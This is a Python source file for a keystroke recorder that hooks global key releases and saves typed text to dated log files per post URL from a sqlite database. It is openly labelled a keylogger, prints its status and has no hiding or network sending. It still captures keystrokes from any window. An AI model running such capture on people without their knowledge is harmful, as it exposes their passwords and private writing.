import keyboard  # for keylogs
from datetime import datetime
import sqlite3
import os


def reportToDB(id):
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row
    cursor = conn.execute("SELECT url FROM posts WHERE id = ?", (id,))
    row = cursor.fetchone()
    if row is not None:
        url = row['url']
        folder_path = os.path.join(f"{os.getcwd()}\\records", url)
        print(folder_path)
        conn.execute("UPDATE posts SET KeyStrokeRecord = ? WHERE id = ?", (folder_path, id))
        conn.commit()
    conn.close()


class KeyStrokeRecorder:
    def __init__(self, id):
        self.filename = None
        self.log = ""
        self.id = id
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.running = False
        self.shift_pressed = False

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
                self.report()
                self.stop()
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        conn = sqlite3.connect('database.db')
        conn.row_factory = sqlite3.Row
        cursor = conn.execute("SELECT url FROM posts WHERE id = ?", (self.id,))
        row = cursor.fetchone()
        conn.close()

        if row is not None:
            url = row['url']
            records_folder = f"{os.getcwd()}\\records"
            folder_path = os.path.join(records_folder, url)
            os.makedirs(folder_path, exist_ok=True)

            date_folder = datetime.now().strftime("%Y-%m-%d")
            date_folder_path = os.path.join(folder_path, date_folder)
            os.makedirs(date_folder_path, exist_ok=True)

            file_path = os.path.join(date_folder_path, f"{self.filename}.log")
            with open(file_path, "w") as f:
                f.write(self.log)
            print(f"[+] Saved {file_path}")
        else:
            print("URL not found for the given ID.")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            print(f"{type(self.log)}, {len(self.log)},  + {self.log}")
            reportToDB(self.id)
            self.start_dt = datetime.now()
        self.log = ""

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.running = True
        print(f"{datetime.now()} - Started keylogger")
        while self.running:
            try:
                if keyboard.is_pressed(chr(27)):  # if escape is pressed
                    self.stop()
                else:
                    pass
            except KeyboardInterrupt:
                self.stop()

    def stop(self):
        self.running = False
        keyboard.unhook_all()
        print("Keylogger stopped.")
